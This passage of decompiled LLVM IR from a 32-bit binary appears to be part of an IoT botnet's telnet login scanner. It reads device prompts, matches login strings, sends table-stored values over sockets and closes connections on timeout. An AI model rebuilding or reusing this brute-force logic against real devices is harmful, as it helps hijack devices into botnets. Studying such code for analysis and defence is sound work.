  %v2_804ad38 = inttoptr i32 %v1_804ad35 to i32*
  store i32 %v2_804ad20, i32* %v2_804ad38, align 4
  br label %dec_label_pc_804ad3a

dec_label_pc_804ad3a:                             ; preds = %dec_label_pc_804acfc, %dec_label_pc_804ad16
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804ad4b = add i32 %v2_804ad0b, 16
  store i32 %v1_804ad4b, i32* %eax.global-to-local, align 4
  %v1_804ad4e = inttoptr i32 %v1_804ad4b to i16*
  %v2_804ad4e = load i16, i16* %v1_804ad4e, align 8
  %v3_804ad4e = zext i16 %v2_804ad4e to i32
  store i32 %v3_804ad4e, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804ad64 = add i32 %v2_804ad0b, 20
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v1_804ad67 = inttoptr i32 %v1_804ad64 to i32*
  %v2_804ad67 = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ad67, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804ad78 = inttoptr i32 %v2_804ad0b to i32*
  %v4_804ad78 = load i32, i32* %v3_804ad78, align 8
  store i32 %v4_804ad78, i32* %eax.global-to-local, align 4
  %v1_804ad7b = load i32, i32* @esp, align 4
  %v2_804ad7b = add i32 %v1_804ad7b, 28
  %v3_804ad7b = inttoptr i32 %v2_804ad7b to i32*
  store i32 %v3_804ad4e, i32* %v3_804ad7b, align 4
  %v0_804ad7f = load i32, i32* @esp, align 4
  %v1_804ad7f = add i32 %v0_804ad7f, 24
  %v2_804ad7f = inttoptr i32 %v1_804ad7f to i32*
  store i32 1024, i32* %v2_804ad7f, align 4
  %v0_804ad87 = load i32, i32* @ebx, align 4
  %v1_804ad87 = load i32, i32* @esp, align 4
  %v2_804ad87 = add i32 %v1_804ad87, 20
  %v3_804ad87 = inttoptr i32 %v2_804ad87 to i32*
  store i32 %v0_804ad87, i32* %v3_804ad87, align 4
  %v0_804ad8b = load i32, i32* @esp, align 4
  %v1_804ad8b = add i32 %v0_804ad8b, 16
  %v2_804ad8b = inttoptr i32 %v1_804ad8b to i32*
  store i32 10000, i32* %v2_804ad8b, align 4
  %v0_804ad93 = load i32, i32* @esp, align 4
  %v1_804ad93 = add i32 %v0_804ad93, 12
  %v2_804ad93 = inttoptr i32 %v1_804ad93 to i32*
  store i32 0, i32* %v2_804ad93, align 4
  %v0_804ad9b = load i32, i32* @esp, align 4
  %v1_804ad9b = add i32 %v0_804ad9b, 8
  %v2_804ad9b = inttoptr i32 %v1_804ad9b to i32*
  store i32 1, i32* %v2_804ad9b, align 4
  %v0_804ada3 = load i32, i32* @esp, align 4
  %v1_804ada3 = add i32 %v0_804ada3, 4
  %v2_804ada3 = inttoptr i32 %v1_804ada3 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e78.36 to i32), i32* %v2_804ada3, align 4
  %v0_804adab = load i32, i32* %eax.global-to-local, align 4
  %v1_804adab = load i32, i32* @esp, align 4
  %v2_804adab = inttoptr i32 %v1_804adab to i32*
  store i32 %v0_804adab, i32* %v2_804adab, align 4
  %v0_804adae = call i32 @readUntil()
  %v1_804adb3 = icmp eq i32 %v0_804adae, 0
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804ad0b, i32* %eax.global-to-local, align 4
  br i1 %v1_804adb3, label %dec_label_pc_804ae78, label %dec_label_pc_804adbb

dec_label_pc_804adbb:                             ; preds = %dec_label_pc_804ad3a
  store i32 0, i32* %v1_804ad10, align 4
  store i16 0, i16* %v1_804ad4e, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804ae02 = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ae02, i32* %eax.global-to-local, align 4
  %v0_804ae04 = load i32, i32* @esp, align 4
  %v1_804ae04 = add i32 %v0_804ae04, 4
  %v2_804ae04 = inttoptr i32 %v1_804ae04 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e78.36 to i32), i32* %v2_804ae04, align 4
  %v0_804ae0c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae0c = load i32, i32* @esp, align 4
  %v2_804ae0c = inttoptr i32 %v1_804ae0c to i32*
  store i32 %v0_804ae0c, i32* %v2_804ae0c, align 4
  %v2_804ae0f = inttoptr i32 %stack_var_-224.253 to i8*
  %v3_804ae0f = call i32 @strstr(i32 %stack_var_-228.255, i8* %v2_804ae0f)
  %v1_804ae14 = icmp eq i32 %v3_804ae0f, 0
  %. = select i1 %v1_804ae14, i8 7, i8 5
  store i8 %., i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804ae56 = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ae56, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804ae5f = load i32, i32* @esp, align 4
  %v2_804ae5f = add i32 %v1_804ae5f, 8
  %v3_804ae5f = inttoptr i32 %v2_804ae5f to i32*
  store i32 1024, i32* %v3_804ae5f, align 4
  %v0_804ae63 = load i32, i32* @esp, align 4
  %v1_804ae63 = add i32 %v0_804ae63, 4
  %v2_804ae63 = inttoptr i32 %v1_804ae63 to i32*
  store i32 0, i32* %v2_804ae63, align 4
  %v0_804ae6b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae6b = load i32, i32* @esp, align 4
  %v2_804ae6b = inttoptr i32 %v1_804ae6b to i32*
  store i32 %v0_804ae6b, i32* %v2_804ae6b, align 4
  %v3_804ae6e = inttoptr i32 %stack_var_-228.255 to i8*
  %v4_804ae6e = call i32 @__GI_memset(i8* %v3_804ae6e, i32 %stack_var_-224.253, i32 %.v2_804a1b4)
  store i32 %v4_804ae6e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b759

dec_label_pc_804ae78:                             ; preds = %dec_label_pc_804ad3a
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804ae8c = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ae8c, i32* %eax.global-to-local, align 4
  %v0_804ae8e = load i32, i32* @esp, align 4
  %v1_804ae8e = add i32 %v0_804ae8e, 4
  %v2_804ae8e = inttoptr i32 %v1_804ae8e to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e81.37 to i32), i32* %v2_804ae8e, align 4
  %v0_804ae96 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae96 = load i32, i32* @esp, align 4
  %v2_804ae96 = inttoptr i32 %v1_804ae96 to i32*
  store i32 %v0_804ae96, i32* %v2_804ae96, align 4
  %v2_804ae99 = inttoptr i32 %stack_var_-224.253 to i8*
  %v3_804ae99 = call i32 @strstr(i32 %stack_var_-228.255, i8* %v2_804ae99)
  store i32 %v3_804ae99, i32* %eax.global-to-local, align 4
  %v1_804ae9e = icmp eq i32 %v3_804ae99, 0
  br i1 %v1_804ae9e, label %dec_label_pc_804aee9, label %dec_label_pc_804aea2

dec_label_pc_804aea2:                             ; preds = %dec_label_pc_804ae78
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804aeb1 = load i32, i32* %v3_804ad78, align 8
  store i32 %v4_804aeb1, i32* %eax.global-to-local, align 4
  %v1_804aeb4 = load i32, i32* @esp, align 4
  %v2_804aeb4 = inttoptr i32 %v1_804aeb4 to i32*
  store i32 %v4_804aeb1, i32* %v2_804aeb4, align 4
  %v1_804aeb7 = call i32 @sclose(i32 %stack_var_-228.255)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804aedf = add i32 %v2_804a289, %v2_804a306
  %v4_804aedf = inttoptr i32 %v3_804aedf to i8*
  store i8 0, i8* %v4_804aedf, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804aee9:                             ; preds = %dec_label_pc_804ae78
  store i32 %v1_804a42569, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804af00 = load i32, i32* %v1_804ad67, align 4
  %v1_804af0d = and i32 %v2_804af00, -256
  store i32 %v1_804af0d, i32* %eax.global-to-local, align 4
  %v4_804af10 = inttoptr i32 %v2_804af00 to i8*
  store i32 %v2_804af00, i32* @edi, align 4
  %v3_804af16 = call i32 @_strlen(i8* %v4_804af10)
  %v0_804af23 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804af29 = mul i32 %v0_804af23, 24
  %v1_804af2e = add i32 %v2_804ab1c, %v2_804af29
  %v1_804af31 = trunc i32 %v3_804af16 to i16
  %v3_804af31 = inttoptr i32 %v1_804af2e to i16*
  store i16 %v1_804af31, i16* %v3_804af31, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad0d, i32* %eax.global-to-local, align 4
  %v2_804af48 = load i32, i32* %v1_804ad10, align 4
  store i32 %v2_804af48, i32* %eax.global-to-local, align 4
  %v1_804af4a = add i32 %v2_804af48, 30
  store i32 %v1_804af4a, i32* @ebx, align 4
  %v0_804af4d = load i32, i32* @esp, align 4
  %v1_804af4d = inttoptr i32 %v0_804af4d to i32*
  store i32 0, i32* %v1_804af4d, align 4
  %v1_804af54 = inttoptr i32 %v2_804af00 to i32*
  %v2_804af54 = call i32 @__GI_time(i32* %v1_804af54)
  store i32 %v2_804af54, i32* %eax.global-to-local, align 4
  %v0_804af59 = load i32, i32* @ebx, align 4
  %v7_804af59 = icmp ult i32 %v0_804af59, %v2_804af54
  %v1_804af5b = icmp eq i1 %v7_804af59, false
  br i1 %v1_804af5b, label %dec_label_pc_804b759, label %dec_label_pc_804af61

dec_label_pc_804af61:                             ; preds = %dec_label_pc_804aee9
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804af70 = load i32, i32* %v3_804ad78, align 8
  store i32 %v4_804af70, i32* %eax.global-to-local, align 4
  %v1_804af73 = load i32, i32* @esp, align 4
  %v2_804af73 = inttoptr i32 %v1_804af73 to i32*
  store i32 %v4_804af70, i32* %v2_804af73, align 4
  %v1_804af76 = call i32 @sclose(i32 %v2_804af00)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804af9e = add i32 %v2_804a289, %v2_804a306
  %v4_804af9e = inttoptr i32 %v3_804af9e to i8*
  store i8 1, i8* %v4_804af9e, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804afa8:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804afb7 = add i32 %v2_804a415, %v2_804a306
  %v4_804afb7 = inttoptr i32 %v3_804afb7 to i8*
  %v5_804afb7 = load i8, i8* %v4_804afb7, align 1
  %v6_804afb7 = zext i8 %v5_804afb7 to i32
  store i32 %v6_804afb7, i32* %eax.global-to-local, align 4
  %v1_804afbf = mul nuw nsw i32 %v6_804afb7, 4
  %v2_804afbf = add nuw nsw i32 %v1_804afbf, 134567488
  %v3_804afbf = inttoptr i32 %v2_804afbf to i32*
  %v4_804afbf = load i32, i32* %v3_804afbf, align 4
  %v1_804afd1 = and i32 %v4_804afbf, -256
  store i32 %v1_804afd1, i32* %eax.global-to-local, align 4
  %v4_804afd4 = inttoptr i32 %v4_804afbf to i8*
  store i32 %v4_804afbf, i32* @edi, align 4
  %v3_804afda = call i32 @_strlen(i8* %v4_804afd4)
  store i32 %v3_804afda, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804aff2 = load i8, i8* %v4_804afb7, align 1
  %v6_804aff2 = zext i8 %v5_804aff2 to i32
  store i32 %v6_804aff2, i32* %eax.global-to-local, align 4
  %v1_804affa = mul nuw nsw i32 %v6_804aff2, 4
  %v2_804affa = add nuw nsw i32 %v1_804affa, 134567488
  %v3_804affa = inttoptr i32 %v2_804affa to i32*
  %v4_804affa = load i32, i32* %v3_804affa, align 4
  store i32 %v4_804affa, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v2_804b010 = add i32 %v2_804a306, %v2_804a245
  %v3_804b010 = inttoptr i32 %v2_804b010 to i32*
  %v4_804b010 = load i32, i32* %v3_804b010, align 8
  store i32 %v4_804b010, i32* %eax.global-to-local, align 4
  %v0_804b013 = load i32, i32* @esp, align 4
  %v1_804b013 = add i32 %v0_804b013, 12
  %v2_804b013 = inttoptr i32 %v1_804b013 to i32*
  store i32 16384, i32* %v2_804b013, align 4
  %v0_804b01b = load i32, i32* @esi, align 4
  %v1_804b01b = load i32, i32* @esp, align 4
  %v2_804b01b = add i32 %v1_804b01b, 8
  %v3_804b01b = inttoptr i32 %v2_804b01b to i32*
  store i32 %v0_804b01b, i32* %v3_804b01b, align 4
  %v0_804b01f = load i32, i32* @ebx, align 4
  %v1_804b01f = load i32, i32* @esp, align 4
  %v2_804b01f = add i32 %v1_804b01f, 4
  %v3_804b01f = inttoptr i32 %v2_804b01f to i32*
  store i32 %v0_804b01f, i32* %v3_804b01f, align 4
  %v0_804b023 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b023 = load i32, i32* @esp, align 4
  %v2_804b023 = inttoptr i32 %v1_804b023 to i32*
  store i32 %v0_804b023, i32* %v2_804b023, align 4
  %v4_804b026 = call i32 @__libc_send(i32 %v4_804afbf, i32 %stack_var_-232.257, i32 %stack_var_-228.255, i32 %stack_var_-224.253)
  %v2_804b02b = icmp slt i32 %v4_804b026, 0
  %v1_804b02d = icmp eq i1 %v2_804b02b, false
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b085 = load i32, i32* %v3_804b010, align 8
  store i32 %v4_804b085, i32* %eax.global-to-local, align 4
  %v0_804b088 = load i32, i32* @esp, align 4
  br i1 %v1_804b02d, label %dec_label_pc_804b076, label %dec_label_pc_804b02f

dec_label_pc_804b02f:                             ; preds = %dec_label_pc_804afa8
  %v2_804b041 = inttoptr i32 %v0_804b088 to i32*
  store i32 %v4_804b085, i32* %v2_804b041, align 4
  %v1_804b044 = call i32 @sclose(i32 %v4_804afbf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b06c = add i32 %v2_804a289, %v2_804a306
  %v4_804b06c = inttoptr i32 %v3_804b06c to i8*
  store i8 1, i8* %v4_804b06c, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b076:                             ; preds = %dec_label_pc_804afa8
  %v1_804b088 = add i32 %v0_804b088, 12
  %v2_804b088 = inttoptr i32 %v1_804b088 to i32*
  store i32 16384, i32* %v2_804b088, align 4
  %v0_804b090 = load i32, i32* @esp, align 4
  %v1_804b090 = add i32 %v0_804b090, 8
  %v2_804b090 = inttoptr i32 %v1_804b090 to i32*
  store i32 2, i32* %v2_804b090, align 4
  %v0_804b098 = load i32, i32* @esp, align 4
  %v1_804b098 = add i32 %v0_804b098, 4
  %v2_804b098 = inttoptr i32 %v1_804b098 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052e75.35 to i32), i32* %v2_804b098, align 4
  %v0_804b0a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0a0 = load i32, i32* @esp, align 4
  %v2_804b0a0 = inttoptr i32 %v1_804b0a0 to i32*
  store i32 %v0_804b0a0, i32* %v2_804b0a0, align 4
  %v4_804b0a3 = call i32 @__libc_send(i32 %v4_804afbf, i32 %stack_var_-232.257, i32 %stack_var_-228.255, i32 %stack_var_-224.253)
  %v2_804b0a8 = icmp slt i32 %v4_804b0a3, 0
  %v1_804b0aa = icmp eq i1 %v2_804b0a8, false
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804b0aa, label %dec_label_pc_804b0f3, label %dec_label_pc_804b0ac

dec_label_pc_804b0ac:                             ; preds = %dec_label_pc_804b076
  %v4_804b0bb = load i32, i32* %v3_804b010, align 8
  store i32 %v4_804b0bb, i32* %eax.global-to-local, align 4
  %v1_804b0be = load i32, i32* @esp, align 4
  %v2_804b0be = inttoptr i32 %v1_804b0be to i32*
  store i32 %v4_804b0bb, i32* %v2_804b0be, align 4
  %v1_804b0c1 = call i32 @sclose(i32 %v4_804afbf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b0e9 = add i32 %v2_804a289, %v2_804a306
  %v4_804b0e9 = inttoptr i32 %v3_804b0e9 to i8*
  store i8 1, i8* %v4_804b0e9, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b0f3:                             ; preds = %dec_label_pc_804b076
  store i8 6, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804b10c:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v2_804b11b = add i32 %v2_804a306, %v2_804a245
  %v1_804b11d = add i32 %v2_804b11b, 12
  store i32 %v1_804b11d, i32* %eax.global-to-local, align 4
  %v1_804b120 = inttoptr i32 %v1_804b11d to i32*
  %v2_804b120 = load i32, i32* %v1_804b120, align 4
  store i32 %v2_804b120, i32* %eax.global-to-local, align 4
  %v1_804b122 = icmp eq i32 %v2_804b120, 0
  %v1_804b124 = icmp eq i1 %v1_804b122, false
  br i1 %v1_804b124, label %dec_label_pc_804b14a, label %dec_label_pc_804b126

dec_label_pc_804b126:                             ; preds = %dec_label_pc_804b10c
  store i32 %v1_804a42569, i32* @ebx, align 4
  %v0_804b129 = load i32, i32* @esp, align 4
  %v1_804b129 = inttoptr i32 %v0_804b129 to i32*
  store i32 0, i32* %v1_804b129, align 4
  %v1_804b130 = inttoptr i32 %v6_804a309 to i32*
  %v2_804b130 = call i32 @__GI_time(i32* %v1_804b130)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804b13a = load i32, i32* @ebx, align 4
  %v2_804b140 = mul i32 %v0_804b13a, 24
  %v2_804b143 = add i32 %v2_804b140, %v2_804a245
  %v1_804b145 = add i32 %v2_804b143, 12
  store i32 %v1_804b145, i32* %eax.global-to-local, align 4
  %v2_804b148 = inttoptr i32 %v1_804b145 to i32*
  store i32 %v2_804b130, i32* %v2_804b148, align 4
  br label %dec_label_pc_804b14a

dec_label_pc_804b14a:                             ; preds = %dec_label_pc_804b10c, %dec_label_pc_804b126
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804b15b = add i32 %v2_804b11b, 16
  store i32 %v1_804b15b, i32* %eax.global-to-local, align 4
  %v1_804b15e = inttoptr i32 %v1_804b15b to i16*
  %v2_804b15e = load i16, i16* %v1_804b15e, align 8
  %v3_804b15e = zext i16 %v2_804b15e to i32
  store i32 %v3_804b15e, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804b174 = add i32 %v2_804b11b, 20
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v1_804b177 = inttoptr i32 %v1_804b174 to i32*
  %v2_804b177 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b177, i32* @ebx, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b188 = inttoptr i32 %v2_804b11b to i32*
  %v4_804b188 = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b188, i32* %eax.global-to-local, align 4
  %v1_804b18b = load i32, i32* @esp, align 4
  %v2_804b18b = add i32 %v1_804b18b, 28
  %v3_804b18b = inttoptr i32 %v2_804b18b to i32*
  store i32 %v3_804b15e, i32* %v3_804b18b, align 4
  %v0_804b18f = load i32, i32* @esp, align 4
  %v1_804b18f = add i32 %v0_804b18f, 24
  %v2_804b18f = inttoptr i32 %v1_804b18f to i32*
  store i32 1024, i32* %v2_804b18f, align 4
  %v0_804b197 = load i32, i32* @ebx, align 4
  %v1_804b197 = load i32, i32* @esp, align 4
  %v2_804b197 = add i32 %v1_804b197, 20
  %v3_804b197 = inttoptr i32 %v2_804b197 to i32*
  store i32 %v0_804b197, i32* %v3_804b197, align 4
  %v0_804b19b = load i32, i32* @esp, align 4
  %v1_804b19b = add i32 %v0_804b19b, 16
  %v2_804b19b = inttoptr i32 %v1_804b19b to i32*
  store i32 10000, i32* %v2_804b19b, align 4
  %v0_804b1a3 = load i32, i32* @esp, align 4
  %v1_804b1a3 = add i32 %v0_804b1a3, 12
  %v2_804b1a3 = inttoptr i32 %v1_804b1a3 to i32*
  store i32 0, i32* %v2_804b1a3, align 4
  %v0_804b1ab = load i32, i32* @esp, align 4
  %v1_804b1ab = add i32 %v0_804b1ab, 8
  %v2_804b1ab = inttoptr i32 %v1_804b1ab to i32*
  store i32 1, i32* %v2_804b1ab, align 4
  %v0_804b1b3 = load i32, i32* @esp, align 4
  %v1_804b1b3 = add i32 %v0_804b1b3, 4
  %v2_804b1b3 = inttoptr i32 %v1_804b1b3 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e81.37 to i32), i32* %v2_804b1b3, align 4
  %v0_804b1bb = load i32, i32* %eax.global-to-local, align 4
  %v1_804b1bb = load i32, i32* @esp, align 4
  %v2_804b1bb = inttoptr i32 %v1_804b1bb to i32*
  store i32 %v0_804b1bb, i32* %v2_804b1bb, align 4
  %v0_804b1be = call i32 @readUntil()
  store i32 %v0_804b1be, i32* %eax.global-to-local, align 4
  %v1_804b1c3 = icmp eq i32 %v0_804b1be, 0
  br i1 %v1_804b1c3, label %dec_label_pc_804b384, label %dec_label_pc_804b1cb

dec_label_pc_804b1cb:                             ; preds = %dec_label_pc_804b14a
  store i32 0, i32* %v1_804b120, align 4
  store i16 0, i16* %v1_804b15e, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b212 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b212, i32* %eax.global-to-local, align 4
  %v0_804b214 = load i32, i32* @esp, align 4
  %v1_804b214 = add i32 %v0_804b214, 4
  %v2_804b214 = inttoptr i32 %v1_804b214 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e81.37 to i32), i32* %v2_804b214, align 4
  %v0_804b21c = load i32, i32* %eax.global-to-local, align 4
  %v1_804b21c = load i32, i32* @esp, align 4
  %v2_804b21c = inttoptr i32 %v1_804b21c to i32*
  store i32 %v0_804b21c, i32* %v2_804b21c, align 4
  %v2_804b21f = inttoptr i32 %stack_var_-232.257 to i8*
  %v3_804b21f = call i32 @strstr(i32 %stack_var_-236.259, i8* %v2_804b21f)
  %v1_804b224 = icmp eq i32 %v3_804b21f, 0
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b2b4 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b2b4, i32* %eax.global-to-local, align 4
  br i1 %v1_804b224, label %dec_label_pc_804b2a0, label %dec_label_pc_804b228

dec_label_pc_804b228:                             ; preds = %dec_label_pc_804b1cb
  store i32 %v2_804b2b4, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804b245 = load i32, i32* @esp, align 4
  %v2_804b245 = add i32 %v1_804b245, 8
  %v3_804b245 = inttoptr i32 %v2_804b245 to i32*
  store i32 1024, i32* %v3_804b245, align 4
  %v0_804b249 = load i32, i32* @esp, align 4
  %v1_804b249 = add i32 %v0_804b249, 4
  %v2_804b249 = inttoptr i32 %v1_804b249 to i32*
  store i32 0, i32* %v2_804b249, align 4
  %v0_804b251 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b251 = load i32, i32* @esp, align 4
  %v2_804b251 = inttoptr i32 %v1_804b251 to i32*
  store i32 %v0_804b251, i32* %v2_804b251, align 4
  %v3_804b254 = inttoptr i32 %stack_var_-236.259 to i8*
  %v4_804b254 = call i32 @__GI_memset(i8* %v3_804b254, i32 %stack_var_-232.257, i32 %stack_var_-228.255)
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b268 = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b268, i32* %eax.global-to-local, align 4
  %v1_804b26b = load i32, i32* @esp, align 4
  %v2_804b26b = inttoptr i32 %v1_804b26b to i32*
  store i32 %v4_804b268, i32* %v2_804b26b, align 4
  %v1_804b26e = call i32 @sclose(i32 %stack_var_-236.259)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b296 = add i32 %v2_804a289, %v2_804a306
  %v4_804b296 = inttoptr i32 %v3_804b296 to i8*
  store i8 0, i8* %v4_804b296, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b2a0:                             ; preds = %dec_label_pc_804b1cb
  %v1_804b2b6 = load i32, i32* @esp, align 4
  %v2_804b2b6 = inttoptr i32 %v1_804b2b6 to i32*
  store i32 %v2_804b2b4, i32* %v2_804b2b6, align 4
  %v1_804b2b9 = inttoptr i32 %stack_var_-236.259 to i8*
  %v2_804b2b9 = call i32 @matchPrompt(i8* %v1_804b2b9)
  %v1_804b2be = icmp eq i32 %v2_804b2b9, 0
  %v1_804b2c0 = icmp eq i1 %v1_804b2be, false
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804b2c0, label %dec_label_pc_804b33a, label %dec_label_pc_804b2c2

dec_label_pc_804b2c2:                             ; preds = %dec_label_pc_804b2a0
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b2d6 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b2d6, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804b2df = load i32, i32* @esp, align 4
  %v2_804b2df = add i32 %v1_804b2df, 8
  %v3_804b2df = inttoptr i32 %v2_804b2df to i32*
  store i32 1024, i32* %v3_804b2df, align 4
  %v0_804b2e3 = load i32, i32* @esp, align 4
  %v1_804b2e3 = add i32 %v0_804b2e3, 4
  %v2_804b2e3 = inttoptr i32 %v1_804b2e3 to i32*
  store i32 0, i32* %v2_804b2e3, align 4
  %v0_804b2eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804b2eb = load i32, i32* @esp, align 4
  %v2_804b2eb = inttoptr i32 %v1_804b2eb to i32*
  store i32 %v0_804b2eb, i32* %v2_804b2eb, align 4
  %v4_804b2ee = call i32 @__GI_memset(i8* %v1_804b2b9, i32 %stack_var_-232.257, i32 %stack_var_-228.255)
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b302 = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b302, i32* %eax.global-to-local, align 4
  %v1_804b305 = load i32, i32* @esp, align 4
  %v2_804b305 = inttoptr i32 %v1_804b305 to i32*
  store i32 %v4_804b302, i32* %v2_804b305, align 4
  %v1_804b308 = call i32 @sclose(i32 %stack_var_-236.259)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b330 = add i32 %v2_804a289, %v2_804a306
  %v4_804b330 = inttoptr i32 %v3_804b330 to i8*
  store i8 1, i8* %v4_804b330, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b33a:                             ; preds = %dec_label_pc_804b2a0
  store i8 7, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b362 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b362, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804b36b = load i32, i32* @esp, align 4
  %v2_804b36b = add i32 %v1_804b36b, 8
  %v3_804b36b = inttoptr i32 %v2_804b36b to i32*
  store i32 1024, i32* %v3_804b36b, align 4
  %v0_804b36f = load i32, i32* @esp, align 4
  %v1_804b36f = add i32 %v0_804b36f, 4
  %v2_804b36f = inttoptr i32 %v1_804b36f to i32*
  store i32 0, i32* %v2_804b36f, align 4
  %v0_804b377 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b377 = load i32, i32* @esp, align 4
  %v2_804b377 = inttoptr i32 %v1_804b377 to i32*
  store i32 %v0_804b377, i32* %v2_804b377, align 4
  %v4_804b37a = call i32 @__GI_memset(i8* %v1_804b2b9, i32 %stack_var_-232.257, i32 %stack_var_-228.255)
  store i32 %v4_804b37a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b759

dec_label_pc_804b384:                             ; preds = %dec_label_pc_804b14a
